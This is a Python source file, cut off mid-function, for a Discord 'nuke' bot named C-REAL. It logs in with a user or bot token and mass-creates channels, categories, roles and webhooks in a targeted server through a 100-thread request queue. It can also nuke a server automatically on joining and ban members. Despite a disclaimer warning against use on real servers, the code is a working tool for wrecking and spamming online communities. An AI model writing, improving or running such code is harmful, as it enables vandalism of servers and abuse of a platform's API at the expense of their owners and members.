"""
MIT License

Copyright (c) 2020

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

Don't use the bot on real servers or use it to spam because this is breaking
discord's ToS, and you will be resulted in an account deletion.
"""

# -*- coding: utf-8 -*-
# discord
import discord, sys, requests, os
from discord.ext import commands
import asyncio
from packaging import version
from random import randint, choice, randrange
from threading import Thread
from queue import Queue
from json import load, dumps, decoder
from io import BytesIO
from math import ceil
# style
try:
    import colorama
    if sys.platform == 'win32':
            colorama.init()
except ImportError: 
    pass 

# Global vars
per_page = 15
commands_per_page = 5
number_of_bomb_default = 250
selected_server = None
sorted_commands = []
webhook_targets = []
saved_ctx = None
nuke_on_join = False

''' #### Not planning to use regex
Super expensive regex if used to check long strings
Find ---------------
hostname/filename
supported protocols:
https://
http://
ftps://
ftp://
IPv4/filename
IPv6/filename
'''
# import re
# re_url = r'\b((?:https?://)?(?:ftps?://)?(?:(?:www\.)?(?:[\da-z\.-]+)\.(?:[a-z]{2,6})|(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)|(?:(?:[0-9a-fA-F]{1,4}:){7,7}[0-9a-fA-F]{1,4}|(?:[0-9a-fA-F]{1,4}:){1,7}:|(?:[0-9a-fA-F]{1,4}:){1,6}:[0-9a-fA-F]{1,4}|(?:[0-9a-fA-F]{1,4}:){1,5}(?::[0-9a-fA-F]{1,4}){1,2}|(?:[0-9a-fA-F]{1,4}:){1,4}(?::[0-9a-fA-F]{1,4}){1,3}|(?:[0-9a-fA-F]{1,4}:){1,3}(?::[0-9a-fA-F]{1,4}){1,4}|(?:[0-9a-fA-F]{1,4}:){1,2}(?::[0-9a-fA-F]{1,4}){1,5}|[0-9a-fA-F]{1,4}:(?:(?::[0-9a-fA-F]{1,4}){1,6})|:(?:(?::[0-9a-fA-F]{1,4}){1,7}|:)|fe80:(?::[0-9a-fA-F]{0,4}){0,4}%[0-9a-zA-Z]{1,}|::(?:ffff(?::0{1,4}){0,1}:){0,1}(?:(?:25[0-5]|(?:2[0-4]|1{0,1}[0-9]){0,1}[0-9])\.){3,3}(?:25[0-5]|(?:2[0-4]|1{0,1}[0-9]){0,1}[0-9])|(?:[0-9a-fA-F]{1,4}:){1,4}:(?:(?:25[0-5]|(?:2[0-4]|1{0,1}[0-9]){0,1}[0-9])\.){3,3}(?:25[0-5]|(?:2[0-4]|1{0,1}[0-9]){0,1}[0-9])))(?::[0-9]{1,4}|[1-5][0-9]{4}|6[0-4][0-9]{3}|65[0-4][0-9]{2}|655[0-2][0-9]|6553[0-5])?(?:/[\w\.-]*)*/?)\b'

# normal functions==============
def exit():
    input('Press enter to exit...')
    sys.exit(1)

def read_json():
    temp = None
    from pathlib import Path
    try:
        if os.path.isfile(Path().absolute().__str__() + '/default.json'):
            temp = load(open(Path().absolute().__str__() + '/default.json'))
        else:
            try:
                print('Cannot find side-by-side default.json file for configuration. Try entering a full path or local path to the configuration file.')
                uinput = input('Path: ')
            except KeyboardInterrupt:
                sys.exit(0)
            except EOFError:
                print('Invalid input/EOFError. This may be caused by some unicode.')
                exit()

            if os.path.isfile(uinput):
                temp = load(open(uinput))
            else:
                print(f'{uinput} file doesn\'t exist.')
                exit()

    except decoder.JSONDecodeError:
        print('Unreadable json formatting in the given configuration file. Make sure the formats are correct.')
        exit()
    try:
        return temp['token'], temp['permissions'], temp['bomb_messages'], temp['webhook_spam'], str(temp['bot_permission']), temp['command_prefix'], temp['bot_status'], temp['verbose'], temp['after']
    except KeyError as e:
        print(f'Missing arguments in the configuration file. {e} is missing.')
        exit()

def banner():
    sys.stdout.buffer.write('''\
 ██████╗                  ██████╗ ███████╗ █████╗ ██╗     
██╔════╝                  ██╔══██╗██╔════╝██╔══██╗██║   Version: 2.0
██║         █████╗        ██████╔╝█████╗  ███████║██║     Made by:
██║         ╚════╝        ██╔══██╗██╔══╝  ██╔══██║██║       TKperson
╚██████╗                  ██║  ██║███████╗██║  ██║███████╗    and
 ╚═════╝                  ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝      cyxl
'''.encode('utf8'))

if version.parse('1.5.1') > version.parse(discord.__version__):
    print('Please update your discord.py.')
    exit()
token, permissions, bomb_messages, webhook_spam, bot_permission, command_prefix, bot_status, verbose, after = read_json()

want_log_request = want_log_console = want_log_message = want_log_errors = False

if verbose & 1 << 0:
    want_log_request = True
if verbose & 1 << 1:
    want_log_console = True
if verbose & 1 << 2:
    want_log_message = True
if verbose & 1 << 3:
    want_log_errors = True

is_selfbot = True
try:
    temp_headers = {'authorization': token, 'content-type': 'application/json'}
    print('Checking selfbot token.', end='\r')
    if not 'id' in requests.get(url='https://discord.com/api/v8/users/@me', headers=temp_headers).json():
        temp_headers['authorization'] = 'Bot ' + token
        print('Checking normal bot token.', end='\r')
        if not 'id' in requests.get(url='https://discord.com/api/v8/users/@me', headers=temp_headers).json():
            print('Invalid token is being used.')
            exit()
        else:
            is_selfbot = False
except requests.exceptions.ConnectionError:
    print('You should probably consider connecting to the internet before using any discord related stuff. If you are connected to wifi and still seeing this message, then maybe try turn off your VPN/proxy/TOR node. If you are still seeing this message or you just don\'t what to turn off vpn, you can try to use websites like repl/heroku/google cloud to host the bot for you. The source code is on https://github.com/TKperson/Nuking-Discord-Server-Bot-Nuke-Bot.')
    exit()
print('Loading scripts...' + ' ' * 15, end='\r')

"""
command_prefix   - command prefix
case_insensitive - readable ascii doesn't have to be all caps or all lowers
self_bot         - bot won't be able to see the message it sent to itself if this is set to false
intents          - permissions on the server side for reading the full members/heavy list.
"""
client = commands.Bot(command_prefix=command_prefix, case_insensitive=True, self_bot=is_selfbot, intents=discord.Intents().all())
client.remove_command('help')
######### Events #########
@client.event
async def on_connect():
    global sorted_commands
    sorted_commands = sorted(client.commands, key=lambda e: e.name[0])
    if bot_status == 'offline':
        await client.change_presence(status=discord.Status.offline)
    elif bot_status == 'invisible':
        await client.change_presence(status=discord.Status.invisible)
    elif bot_status == 'online':
        await client.change_presence(status=discord.Status.online)
    elif bot_status == 'idle':
        await client.change_presence(status=discord.Status.idle)
    elif bot_status == 'dnd' or bot_status == 'do_not_disturb':
        await client.change_presence(status=discord.Status.do_not_disturb)

@client.event
async def on_ready():
    banner()
    print('/+========================================================')
    print('| | Bot ready.')
    print('| + Logged in as')
    print(f'| | {client.user.name}#{client.user.discriminator}')
    print(f'| | {client.user.id}')
    print('| + Permission given to ')
    for permission in permissions:
        print(f'| | {permission}')
    print('| + Bot prefix: ' + command_prefix)
    if is_selfbot:
        print('| + [Selfbot] This is a selfbot. Join servers with join codes.')
    else:
        print(f'| + https://discord.com/api/oauth2/authorize?client_id={client.user.id}&permissions={bot_permission}&scope=bot')
    print('| ~*************************************')
    print('\\+-----')

    # global selected_server
    # selected_server = client.guilds[1]
    # from dill.source import getsource
    # print(getsource(selected_server.create_text_channel))
    # import logging

    # # These two lines enable debugging at httplib level (requests->urllib3->http.client)
    # # You will see the REQUEST, including HEADERS and DATA, and RESPONSE with HEADERS but without DATA.
    # # The only thing missing will be the response.body which is not logged.
    # import http.client as http_client
    # http_client.HTTPConnection.debuglevel = 1

    # # You must initialize logging, otherwise you'll not see debug output.
    # logging.basicConfig()
    # logging.getLogger().setLevel(logging.DEBUG)
    # requests_log = logging.getLogger("requests.packages.urllib3")
    # requests_log.setLevel(logging.DEBUG)
    # requests_log.propagate = True

    # # requests.get('https://httpbin.org/headers')
    # await selected_server.create_text_channel('lol')

### logs ###
async def log(ctx, message):

    """
    Logging messages to the user
    no args, but has settings.

    Modes:
    - Discord side

    - coming soon
    """
    if want_log_message:
        try:
            await ctx.send(message)
        except discord.errors.HTTPException:
            for i in range(ceil(len(message) / 2000)):
                await log(ctx, message[2000 * i:2000 * (i + 1)])

def consoleLog(message):
    if want_log_console:
        print(message)

@client.event
async def on_command_error(ctx, error):
    # source: https://gist.github.com/AileenLumina/510438b241c16a2960e9b0b014d9ed06
    # source: https://github.com/Rapptz/discord.py/blob/master/discord/errors.py
    """
    Error handlers
    It's always a good idea to look into the source code to find things that are hard to find on the internet.
    """
    if not want_log_errors or hasattr(ctx.command, 'on_error'):
        return

    # get the original exception
    error = getattr(error, 'original', error)

    # print(error)
    # print(str(type(error)))

    if isinstance(error, commands.CommandNotFound):
        if checkPerm(ctx):
            try:
                await log(ctx, f'Command `{ctx.message.content}` is not found.')
            except discord.errors.HTTPException:
                await log(ctx, 'That command is not found.')

    elif isinstance(error, commands.CheckFailure):
        pass

    elif isinstance(error, discord.Forbidden):
        await log(ctx, f'403 Forbidden: Missing permission.')

    elif isinstance(error, commands.BotMissingPermissions):
        missing = [perm.replace('_', ' ').replace('guild', 'server').title() for perm in error.missing_perms]
        if len(missing) > 2:
            fmt = '{}, and {}'.format("**, **".join(missing[:-1]), missing[-1])
        else:
            fmt = ' and '.join(missing)
        _message = 'I need the **{}** permission(s) to run this command.'.format(fmt)
        await log(ctx, _message)
    
    elif isinstance(error, commands.MissingPermissions):
        missing = [perm.replace('_', ' ').replace('guild', 'server').title() for perm in error.missing_perms]
        if len(missing) > 2:
            fmt = '{}, and {}'.format("**, **".join(missing[:-1]), missing[-1])
        else:
            fmt = ' and '.join(missing)
        _message = 'You need the **{}** permission(s) to use this command.'.format(fmt)
        await log(ctx, _message)
    elif isinstance(error, commands.CommandInvokeError):
        await log(ctx, 'Command invoke error')
    
    elif isinstance(error, discord.errors.HTTPException):
        # has already been handled in "def log"
        pass

    elif isinstance(error, commands.UserInputError):
        await log(ctx, 'Invalid input.')
        # await self.send_command_help(ctx)

    elif isinstance(error, commands.MissingRequiredArgument):
        if error.param.name == 'inp':
            await log(ctx, 'You forgot to give me input to repeat!')

    elif isinstance(error, commands.BadArgument):
            if ctx.command.qualified_name == 'tag list':  # Check if the command being invoked is 'tag list'
                await log(ctx, 'I could not find that member. Please try again.')

    else:
        # 'args', 'code', 'response', 'status', 'text', 'with_traceback'
        # print(error)
        # print(error.args)
        # print(type(error.args))
        try:
            await log(ctx, '%s' % error.args)
        except discord.errors.NotFound: # When ctx.channel is deleted 
            # consoleLog('%s' % error.args)
            pass

@client.event
async def on_guild_join(guild):
    if nuke_on_join:
        global selected_server
        selected_server = guild
        await nuke(saved_ctx)

def isDM(ctx):
    """
    No args
    Checking if the ctx is whether from DM or in a server. There are different handlers for handling some commands. 
    """

    if isinstance(ctx.channel, discord.channel.DMChannel):
        return True # in dm
    return False # in server            

def nameIdHandler(name):
    if name.startswith('<@!') or name.startswith('<@&'):
        return name[:-1][3:]
    return name

async def embed(ctx, n, title, array):
    """
    Parameters:
    n     - page number. And default is 1
    title - Command name/title
    array - The list for handling
    """

    if not n.isdigit() or (n := int(n) - 1) < 0:
        await log(ctx, 'Bad page number.')
        return

    names = ''
    ids = ''

    item_length = len(array)
    if item_length == 0:
        return await ctx.send(f'{title} count: 0')
    init_item = n * per_page
    final_item = init_item + per_page
    if init_item > item_length - per_page:
        if init_item > item_length:
            await ctx.send('Invalid page number.')
            return
        final_item = init_item + (item_length % per_page)
    else:
        final_item = init_item + per_page

    for i in range(init_item, final_item, 1):
        item = array[i]
        names += f'{item.name} \n'
        ids += f'{str(item.id)} \n'

    theColor = randint(0, 0xFFFFFF)
    embed = discord.Embed(
        title = title,
        description = f'Total count: {str(item_length)}; color: #{hex(theColor)[2:].zfill(6)}',
        color = theColor
    )
    embed.add_field(name='Name', value=names, inline=True)
    embed.add_field(name='ID', value=ids, inline=True)
    embed.set_footer(text=f'{n+1}/{str(ceil(item_length / per_page))}')
    await ctx.send(embed=embed)

async def hasTarget(ctx):
    """
    Checking if there's a selected server for using the comands.
    """
    global selected_server
    if selected_server is not None:
        return True
    elif not isDM(ctx):
        selected_server = ctx.guild
        await log(ctx, f'You have been automatically `{command_prefix}connect` to server `{selected_server.name}` because you are not connected to a server and using a command inside a server.')
        return True
    else:
        await log(ctx, f'I am not connected to a server. Try `{command_prefix}servers` and `{command_prefix}connect`')
        return False

def containing(a, b):
    for c in a:
        if c.name.lower() == b.lower() or str(c.id) == b:
            return c
    return None

def checkPerm(ctx):
    for user in permissions:
        if str(ctx.author.id) == user or f'{ctx.author.name}#{ctx.author.discriminator}' == user:
            return True
    if not isDM(ctx):
        consoleLog(f'{ctx.author.name}#{ctx.author.discriminator} tried to use "{ctx.message.content}" in server "{ctx.guild.name}", at channel "{ctx.channel.name}".')
    else:
        consoleLog(f'{ctx.author.name}#{ctx.author.discriminator} tried to use "{ctx.message.content}" in the bot\'s direct message.')
    return False

def fixedChoice():
    return bomb_messages['fixed'][randint(0, len(bomb_messages['fixed']) - 1)]

base64_char = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/'
def random_b64():
    return ''.join(choice(base64_char) for _ in range(bomb_messages['random']))

alphanum = '0123456789!@#$%^&*ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
def random_an():
    return ''.join(choice(alphanum) for _ in range(bomb_messages['random'])) 
######### Commands ##########

######### Listing  ##########
@commands.check(checkPerm)
@client.command(name='help', aliases=['h', 'commands'])
async def help(ctx, asked_command=None):
    help_list = '```'
    if asked_command is None:
        for command in sorted_commands:
            help_list += f'[{command.name}] '
        await ctx.send(help_list + f'\n\nYou can try {command_prefix}help <command> to see all the aliases for the command. Or read the manual.md for more infomation about the commands.```')
    else:
        for command in sorted_commands:
            if asked_command.lower() == command.name.lower():
                help_command = f'```{command_prefix}<{command.name}'
                for aliase in command.aliases:
                    help_command += f'|{aliase}'
                help_command += '>'

                for param, default in command.params.items():
                    if param == 'ctx':
                        continue

                    if default.empty is not default.default:
                        help_command += ' {' + param + '=' + str(default.default) + '}'
                    else:
                        help_command += ' [' + param + ']'
                    if default.kind.name == 'KEYWORD_ONLY':
                        break
                help_command += '```'

                await ctx.send(help_command)
                return
        await log(ctx, f'Unable to find command `{asked_command}`.')

@commands.check(checkPerm)
@client.command(name='servers', aliases=['se', 'server'])
async def servers(ctx, n='1'):
    await embed(ctx, n, 'Servers', client.guilds)

@commands.check(checkPerm)
@client.command(name='channels', aliases=['tc', 'textchannels', 'textchannel', 'channel'])
async def channels(ctx, n='1'):
    if not await hasTarget(ctx):
        return
    await embed(ctx, n, 'Text channels', selected_server.text_channels)

@commands.check(checkPerm)
@client.command(name='roles', aliases=['ro', 'role'])
async def roles(ctx, n='1'):
    if not await hasTarget(ctx):
        return
    await embed(ctx, n, 'Roles', selected_server.roles)

@commands.check(checkPerm)
@client.command(name='categories', aliases=['cat', 'category'])
async def categories(ctx, n='1'):
    if not await hasTarget(ctx):
        return
    await embed(ctx, n, 'Categories', selected_server.categories)

@commands.check(checkPerm)
@client.command(name='voiceChannels', aliases=['vc', 'voicechannel'])
async def voiceChannels(ctx, n='1'):
    if not await hasTarget(ctx):
        return
    await embed(ctx, n, 'Voice channels', selected_server.voice_channels)

@commands.check(checkPerm)
@client.command(name='emojis', alises=['em', 'emoji'])
async def emojis(ctx, n='1'):
    if not await hasTarget(ctx):
        return
    await embed(ctx, n, 'Emojis', selected_server.emojis)

@commands.check(checkPerm)
@client.command(name='bans')
async def bans(ctx, n='1'):
    if not await hasTarget(ctx):
        return
    await embed(ctx, n, 'Bans', [s.user for s in await selected_server.bans()])

@commands.check(checkPerm)
@client.command(name='connect', aliases=['con'])
async def connect(ctx, *, server=None):
    temp_name = server
    server = containing(client.guilds, server)
    if server is None:
        await log(ctx, f'Unable to find {temp_name} server.')
        return
    global selected_server
    selected_server = server
    await log(ctx, f'Successfully connected to {server.name}.')

#########  Unities  ##########
@commands.check(checkPerm)
@client.command(name='addChannel', aliases=['aCh', 'aChannel'])
async def addChannel(ctx, channel_name, *, category=None):
    if not await hasTarget(ctx):
        return

    if category is not None:
        temp = category
        category = containing(selected_server.categories, category)
        if category is None:
            consoleLog(f'Unable to find category: {temp}')
            return

    try:
        await selected_server.create_text_channel(channel_name, category=category)
        if category is None:
            category = 'No category.'
        consoleLog(f'Successfully added channel: {channel_name}')
    except:
        consoleLog(f'Unable to add channel: {channel_name}')
        raise

@commands.check(checkPerm)
@client.command(name='addVoiceChannel', aliases=['aVoiceChannel', 'aVC'])
async def addVoiceChannel(ctx, voice_channel, *, category=None):
    if not await hasTarget(ctx):
        return

    if category is not None:
        temp = category
        category = containing(selected_server.categories, category)
        if category is None:
            await log(ctx, f'Unable to find category: {temp}')
            return

    try:
        await selected_server.create_voice_channel(voice_channel, category=category)
        if category is None:
            category = 'No category.'
        await log(ctx, f'Successfully added VC: {voice_channel} to category: {category}')
    except:
        await log(ctx, f'Unable to add: VC: {voice_channel}')
        raise

@commands.check(checkPerm)
@client.command(name='addEmoji', aliases=['aEmoji', 'aEm'])
async def addEmoji(ctx, item, *, name=None, bits=None):
    if not await hasTarget(ctx):
        return

    if bits is None:
        # Raw IPv4 and IPv6 are not supported
        if item.startswith(('https://', 'http://', 'ftp://', 'ftps://')): # Link EX: https://www.example.com/aaa.png
            try:
                if name is None:
                    await log(ctx, 'Name for emoji? I\'m not gonna always name it for you...')
                    return 
                await selected_server.create_custom_emoji(name=(name), image=BytesIO(requests.get(item).content).read())
                await log(ctx, 'Successfully changed the current server icon.')
            except:
                raise

        elif item[0] == '<': # EX: <a:triggeredd:627060014431076352>
            item = item.split(':')
            if name is None:
                name = item[1]
            try:
                if item[0] == '<a': # Animated
                     await selected_server.create_custom_emoji(name=(name), image=BytesIO(requests.get(f'https://cdn.discordapp.com/emojis/{item[2][:-1]}.gif?v=1').content).read())
                else:
                    await selected_server.create_custom_emoji(name=(name), image=BytesIO(requests.get(f'https://cdn.discordapp.com/emojis/{item[2][:-1]}.png?v=1').content).read())
                await log(ctx, f'Successfully added emoji: {name}')
            except:
                raise

        elif os.path.isfile(item): # File EX: C:\Users\user\Desktop\something.jpg or EX: .\icon\something.jpg
            with open(item, 'rb') as data:
                await selected_server.create_custom_emoji(name=(name), image=data.read())
                await log(ctx, f'Successfully added emoji: {name}')
        else:
            await log(ctx, 'Bad path to image.')
    else:
        selected_server.create_custom_emoji(name=(name), image=bits)

@commands.check(checkPerm)
@client.command(name='addCategory', aliases=['aCat', 'aCa'])
async def addCategory(ctx, *, category_name):
    if not await hasTarget(ctx):
        return
    
    try:
        await selected_server.create_category(category_name)
        consoleLog(f'Successfully created category: {category_name}')
    except:
        consoleLog(f'Unable to create category: {category_name}')
        raise
    
@commands.check(checkPerm)
@client.command(name='addRole', aliases=['aRole', 'aR'])
async def addRole(ctx, *, name):
    if not await hasTarget(ctx):
        return
    try:
        name = name.split()
        perms = name.pop(-1)
        await selected_server.create_role(name=' '.join(name), permissions=discord.Permissions(permissions=int(perms)))
        await log(ctx, f'Successfully added `{name}` with permission `{perms}`.')
    except:
        await log(ctx, f'Failed to add `{name}`.')
        raise

@commands.check(checkPerm)
@client.command(name='moveRole', aliases=['mRole', 'mR'])
async def moveRole(ctx, *, name):
    if not await hasTarget(ctx):
        return
    try:
        name = name.split()
        position = name.pop(-1)
        name = ' '.join(name)
        if len(name) == 0 or not position.isdigit():
            await log(ctx, 'Invalid inputs.')
            return

        role = containing(selected_server.roles, name)
        if role is None:
            await log(ctx, f'Unable to find role `{name}`.')
        await role.edit(position=int(position))
        await log(ctx, 'Role moved.`')
    except:
        await log(ctx, f'Unable to move `{name}` to position `{position}`.')
        raise

@commands.check(checkPerm)
@client.command(name='deleteRole', aliases=['dRole', 'dR'])
async def deleteRole(ctx, *, name):
    if not await hasTarget(ctx):
        return
    
    role = containing(selected_server.roles, name)
    if role is None:
        await log(ctx, f'Unable to find `{name}`.')

    try:
        await role.delete()
        consoleLog(f'Successfully removed {role.name}')
    except:
        await log(ctx, f'Unable to delete `{role.name}`.')
        raise

@commands.check(checkPerm)
@client.command(name='deleteChannel', aliases=['dChannel', 'dCh'])
async def deleteChannel(ctx, channel_name):
    if not await hasTarget(ctx):
        return

    channel = containing(selected_server.text_channels, channel_name)

    if channel is None:
        await log(f'Unable to find text channel "`{channel_name}`".')

    try:
        await channel.delete(reason=None)
        consoleLog(f'Channel: {channel.name} is deleted.')
    except:
        consoleLog(f'Unable to delete channel: {channel.name}')
        raise

@commands.check(checkPerm)
@client.command(name='deleteVoiceChannel', aliases=['dVC', 'dVoiceChannel'])
async def deleteVoiceChannel(ctx, VC_name):
    if not await hasTarget(ctx):
        return

    channel = containing(selected_server.voice_channels, VC_name)

    if channel is None:
        await log(f'Unable to find voice channel "`{VC_name}`".')

    try:
        await channel.delete(reason=None)
        consoleLog(f'Voice channel "{channel.name}" is deleted.')
    except:
        consoleLog(f'Unable to delete voice channel "{channel.name}".')
        raise

@commands.check(checkPerm)
@client.command(name='deleteCategory', aliases=['dCat', 'dCategory'])
async def deleteCategory(ctx, *, category_name):
    if not await hasTarget(ctx):
        return

    channel = containing(selected_server.categories, category_name)

    if channel is None:
        await log(f'Unable to find category "`{category_name}`".')

    try:
        await channel.delete(reason=None)
        consoleLog(f'Category "{channel.name}" is deleted.')
    except:
        consoleLog(f'Unable to delete category "{channel.name}".')
        raise

@commands.check(checkPerm)
@client.command(name='deleteCC', aliases=['dCC'])
async def deleteCC(ctx, *, name):
    if not await hasTarget(ctx):
        return

    channel = containing(selected_server.channels, name)

    if channel is None:
        await log(ctx, f'Unable to find channel `{name}`.')
        return

    try:
        await channel.delete(reason=None)
        consoleLog(f'Channel "{channel.name}" is removed from the server.')
    except:
        consoleLog(f'Unable to delete channel "{channel.name}".')
        raise

@commands.check(checkPerm)
@client.command(name='deleteEmoji', aliases=['dEm'])
async def deleteEmoji(ctx, *, name):
    emoji = containing(selected_server.emojis, name)

    if emoji is None:
        await log(ctx, f'Unable to find channel `{name}`.')

    try:
        await emoji.delete(reason=None)
        consoleLog(f'Emoji `{emoji.name}` is removed from the server.')
    except:
        consoleLog(f'Unable to delete emoji: `{emoji.name}`.')
        raise

@commands.check(checkPerm)
@client.command(name='ban')
async def ban(ctx, member:discord.Member):
    if not await hasTarget(ctx):
        return
    try:
        await member.ban()
        consoleLog(f'Successfully banned `{member.name}#{member.discriminator}`.')
    except:
        consoleLog(f'Unable to ban `{member.name}#{member.discriminator}`.')
        raise

@commands.check(checkPerm)
@client.command(name='unban')
async def unban(ctx, *, name):
    if not await hasTarget(ctx):
        return

    member = containing([s.user for s in await selected_server.bans()], name)
    if member is None:
        await log(ctx, f'Unable to find user `{name}` in server `{selected_server.name}`.')
        return
    try:
        await selected_server.unban(member)
        await log(ctx, f'{name} is now free :).')
    except:
        consoleLog(f'Failed to unban {name}.')
        raise
    
@commands.check(checkPerm)
@client.command(name='roleTo')
async def roleTo(ctx, member_name, *, role_name):
    if not await hasTarget(ctx):
        return

    role = containing(selected_server.roles, nameIdHandler(role_name))
    if role is None:
        await log(ctx, f'Unable to find role `{role_name}`.')
        return
    # discord.utils.get is useless don't use it it's way slower than "containing"
    member = containing(selected_server.members, nameIdHandler(member_name))
    if member is None:
        await log(ctx, f'Unable to find user `{member_name}`.')
        return

    if role in member.roles:
        try:
            await member.remove_roles(role)
            await log(ctx, f'Successfully removed role `{role.name}` from user `{member.name}`.')
        except:
            await log(ctx, f'Unable to remove role `{role.name}` from user `{member.name}`.')
            raise
    else:
        try:
            await member.add_roles(role)
            await log(ctx, f'Successfully given role `{role.name}` to user `{member.name}`.')
        except:
            await log(ctx, f'Unable to add role `{role.name}` to user `{member.name}`.')
            raise

######### Bombs #########
@commands.check(checkPerm)
@client.command(name='kaboom')
async def kaboom(ctx, n, method):
    if not await hasTarget(ctx):
        return 
    
    if not n.isdigit() or int(n) < 0:
        await log(ctx, 'Please insert an integer that is greater than 0.')
        return

    await log(ctx, f'A series of bombs have been released into `{selected_server}`.')
    tasks = [channelBomb(ctx, n, method), categoryBomb(ctx, n, method), roleBomb(ctx, n, method)]
    await asyncio.gather(*tasks)
    

concurrent = 100
q = Queue(concurrent * 2)
def requestMaker():
    while True:
        requesting, url, headers, payload = q.get()
        try:
            r = requesting(url, data=dumps(payload), headers=headers).json()
            if 'retry_after' in r:
                if want_log_request:
                    if isinstance(r['retry_after'], int): # Discord will return all integer time if the retry after is less then 10 seconds which is in miliseconds.
                        r['retry_after'] /= 1000
                    if r['retry_after'] > 5:
                        consoleLog(f'Rate limiting has been reached, and this request has been cancelled due to retry-after time is greater than 5 seconds: Wait {str(r["retry_after"])} more seconds.')
                        q.task_done()
                        continue
                    consoleLog(f'Rate limiting has been reached: Wait {str(r["retry_after"])} more seconds.')
                q.put((requesting, url, headers, payload))
        except decoder.JSONDecodeError:
            pass
        q.task_done()
for i in range(concurrent):
    _thread = Thread(target=requestMaker, daemon=True)
    _thread.start()

@commands.check(checkPerm)
@client.command(name='channelBomb')
async def channelBomb(ctx, n, method='fixed'):
    if not await hasTarget(ctx):
        return

    if not n.isdigit() or (n := int(n)) < 0:
        await log(ctx, 'Please insert an integer that is greater than 0.')
        return

    if method == 'fixed':
        method = fixedChoice
    elif method == 'b64':
        method = random_b64
    elif method == 'an':
        method = random_an
    else:
        await log(ctx, f'Unable to find choice "{method}".')
        return

    consoleLog('Channel bombing has started.')
    headers = {
        'content-type': 'application/json'
    }
    if is_selfbot:
        headers['authorization'] = token
    else:
        # This is the hardest thing that I have tried to find in my life took me ages to know "Bot <token>" is actually the bot's authorization
        headers['authorization'] = 'Bot ' + token
    for i in range(n):
        payload = {
            'type': 0,
            'name': method(),
            'permission_overwrites': []
        }
        q.put((requests.post, f'https://discord.com/api/v8/guilds/{selected_server.id}/channels', headers, payload))

    q.join()
    consoleLog('Done text channel bombing.')

@commands.check(checkPerm)
@client.command(name='categoryBomb')
async def categoryBomb(ctx, n, method):
    if not await hasTarget(ctx):
        return

    if not n.isdigit() or (n := int(n)) < 0:
        await log(ctx, 'Please insert an integer that is greater than 0.')
        return

    if method == 'fixed':
        method = fixedChoice
    elif method == 'b64':
        method = random_b64
    elif method == 'an':
        method = random_an
    else:
        await log(ctx, f'Unable to find choice "{method}".')
        return

    consoleLog('Channel bombing has started.')
    headers = {
        'content-type': 'application/json'
    }
    if is_selfbot:
        headers['authorization'] = token
    else:
        # This is the hardest thing that I have tried to find in my life took me ages to know "Bot <token>" is actually the bot's authorization
        headers['authorization'] = 'Bot ' + token
    for i in range(n):
        payload = {
            'type': 4,
            'name': method(),
            'permission_overwrites': []
        }
        q.put((requests.post, f'https://discord.com/api/v8/guilds/{selected_server.id}/channels', headers, payload))

    q.join()
    consoleLog('Done category bombing.')

@commands.check(checkPerm)
@client.command(name='roleBomb')
async def roleBomb(ctx, n, method):
    if not await hasTarget(ctx):
        return

    if not n.isdigit() or (n := int(n)) < 0:
        await log(ctx, 'Please insert an integer that is greater than 0.')
        return
    
    if method == 'fixed':
        method = fixedChoice
    elif method == 'b64':
        method = random_b64
    elif method == 'an':
        method = random_an
    else:
        await log(ctx, f'Unable to find choice "{method}".')
        return

    consoleLog('Role bombing has started.')
    headers = {
        'content-type': 'application/json'
    }
    if is_selfbot:
        headers['authorization'] = token
    else:
        # This is the hardest thing that I have tried to find in my life took me ages to know "Bot <token>" is actually the bot's authorization
        headers['authorization'] = 'Bot ' + token
    for i in range(n):
        payload = {
            'name': method()
        }
        q.put((requests.post, f'https://discord.com/api/v8/guilds/{selected_server.id}/roles', headers, payload))

    q.join()
    consoleLog('Done role bombing.')

######### webhooks ##########
@commands.check(checkPerm)
@client.command(name='webhook', aliases=['webhooks', 'wh'])
async def webhook(ctx, *, args=None):
    if not await hasTarget(ctx):
        return

    if args is None or args.isdigit(): # webhook list
        if args is None:
            args = '1'
        try:
            await embed(ctx, args, 'Webhooks', await selected_server.webhooks())
            return
        except:
            raise
    args = args.split()
    if args[0] == 'create' or args[0] == 'add': # webhook create
        args.pop(0)
        name = ' '.join(args)

        webhooks = await selected_server.webhooks()
        webhooks_length = len(webhooks)

        headers = {'content-type': 'application/json'}
        if is_selfbot:
            headers['authorization'] = token
        else:
            headers['authorization'] = 'Bot ' + token

        channels = name.split()
        if int(name) < 0:
            await log(ctx, f'A smol negative number will break this bot?')
            return

        if len(channels) == 1 and int(name) <= 50: ## probably will replace this with auto check channel id
            channels = selected_server.text_channels
            if int(name) > len(channels):
                await log(ctx, f'This adding webhooks method can only distribute webhooks evenly and randomly throughout the text channels. You entered `{name}`, and there are only `{str(len(channels))}` text channel(s) in the server. If you don\'t what to add more text channels. You can use this command a few more times with a positive integer that is less than `{str(len(channels) + 1)}`.')
                return
            for i in range(int(name)):
                payload = {'name': random_b64()}
                q.put((requests.post, f'https://discord.com/api/v8/channels/{channels.pop(randrange(len(channels))).id}/webhooks', headers, payload))
            q.join()
            await log(ctx, f'`{name}` webhooks has been created.')
        elif len(channels) == 1 and int(name) < 100000000:
            await log(ctx, f'The maximum webhooks that can be created every hour per server is 50. And you entered `{name}`.')
        else:
            for channel in channels:
